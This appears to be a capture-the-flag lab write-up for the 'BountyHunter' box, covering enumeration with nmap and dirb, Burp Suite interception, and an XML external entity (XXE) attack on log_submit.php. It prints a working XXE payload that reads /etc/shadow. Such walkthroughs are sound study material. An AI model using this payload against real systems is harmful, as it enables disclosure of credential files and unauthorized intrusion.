### Box Info
OS: Linux
IP: 10.10.11.100

## Part I 

### Skills learned:
xml xxe vulnerability


### Enum
nmap -p- -A -oN BountyHunter.txt ${IP}
+ 22 SSH 
+ 80 http Apache httpd 2.4.41

### Search
Yields
+ https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

### Step 1: 
+ dirb ${IP} || dirb ${IP}/ -X .php
  + /assets/
  + /log_submit.php
  + /resources/
  
### Burp suite
+ ${IP}/log_submit.php
+ dummy test packet
  + Data needs to be *URL then Base64 decoded*
  + Find template https://github.com/payloadbox
  + adjust titles to mimic db.php titles
  + payload needs to be *Base64 then url encoded*
+ Send payload via Burp/Repeater.

#### db.php payload:
<?xml version="1.0" encoding="ISO-8859-1"?>
    <bugreport>
    <title>test</title>
    <cwe>test</cwe>
    <cvss>test</cvss>
    <reward>test</reward>
    </bugreport>

#### payload file disclosure:
<?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
    <bugreport>
    <title>&ent;</title>
    <cwe>test</cwe>
    <cvss>test</cvss>
    <reward>test</reward>
    </bugreport>

Obtain Username: ${UN}
